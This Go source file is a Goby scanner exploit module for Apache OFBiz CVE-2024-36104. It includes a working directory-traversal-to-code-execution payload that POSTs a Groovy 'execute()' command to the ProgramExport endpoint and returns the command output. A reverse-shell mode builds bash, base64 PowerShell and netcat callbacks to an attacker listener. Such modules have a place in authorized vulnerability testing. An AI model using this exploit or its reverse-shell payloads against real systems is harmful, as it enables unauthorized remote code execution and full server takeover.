package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Apache OFBiz /webtools/control/forgotPassword/././ProgramExport Directory Traversal to Code Execution Vulnerability (CVE-2024-36104)",
    "Description": "<p>Apache OFBiz is an e-commerce platform used to build multi-layer, distributed e-commerce application systems at the enterprise level that are cross-platform, cross-database, and cross-application server. </p><p>There is a directory traversal code execution vulnerability in Apache OFBiz &lt; 18.12.14. An attacker can use a POST request in the /webtools/control/forgotPassword/././ProgramExport path and add the groovyProgram parameter in the request body to send the attack payload to achieve arbitrary code execution.</p>",
    "Product": "Apache_OFBiz",
    "Homepage": "http://ofbiz.apache.org/",
    "DisclosureDate": "2024-06-02",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"http://www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "GobyQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"http://www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "Level": "3",
    "Impact": "<p>Apache OFBiz directory traversal code execution vulnerability, attackers can exploit this vulnerability to execute arbitrary code on the server side, write into the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The official security update has been released, and it is recommended to upgrade to 18.12.14 or above.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-36104"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Apache OFBiz /webtools/control/forgotPassword/././ProgramExport 目录遍历致代码执行漏洞 (CVE-2024-36104)",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。</p><p>Apache OFBiz &lt; 18.12.14的版本中存在目录遍历致代码执行漏洞，攻击者可以在/webtools/control/forgotPassword/././ProgramExport路径下使用POST请求，并在请求体中添加groovyProgram参数来发送攻击载荷实现任意代码执行。<br></p>",
            "Recommendation": "<p>官方已经发布安全更新，建议升级至18.12.14及其以上。<br></p>",
            "Impact": "<p>Apache OFBiz 目录遍历致代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache OFBiz /webtools/control/forgotPassword/././ProgramExport Directory Traversal to Code Execution Vulnerability (CVE-2024-36104)",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz is an e-commerce platform used to build multi-layer, distributed e-commerce application systems at the enterprise level that are cross-platform, cross-database, and cross-application server.&nbsp;</p><p>There is a directory traversal code execution vulnerability in Apache OFBiz &lt; 18.12.14. An attacker can use a POST request in the /webtools/control/forgotPassword/././ProgramExport path and add the groovyProgram parameter in the request body to send the attack payload to achieve arbitrary code execution.<br></p>",
            "Recommendation": "<p>The official security update has been released, and it is recommended to upgrade to 18.12.14 or above.<br></p>",
            "Impact": "<p>Apache OFBiz directory traversal code execution vulnerability, attackers can exploit this vulnerability to execute arbitrary code on the server side, write into the backdoor, obtain server permissions, and then control the entire web server.<br><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PostTime": "2024-06-12",
    "PocId": "10961"
}`

	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			re := regexp.MustCompile(RegularUrl)
			// 查找匹配的内容
			matches := re.FindStringSubmatch(RegularContent)
			if len(matches) > 1 {
				return matches[1], nil
			} else {
				return "", fmt.Errorf("can't match value")
			}
		}
		//漏洞url地址
		url := "/webtools/control/forgotPassword/%2e/%2e/ProgramExport"
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
		}

		data := "groovyProgram=throw new Exception('" + command + "'.execute().text);"
		resp, err := setPostRequest(hostInfo, url, data, header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", fmt.Errorf("request statuscode not 200")
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult, err := makeRegular(resp.RawBody, `java\.lang\.Exception:([\s\S]*?)</p>`)
		if err != nil {
			return "", "", err
		}

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			//开头为数字，他就只会返回第一段数字部分
			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c \\'{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}\\'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
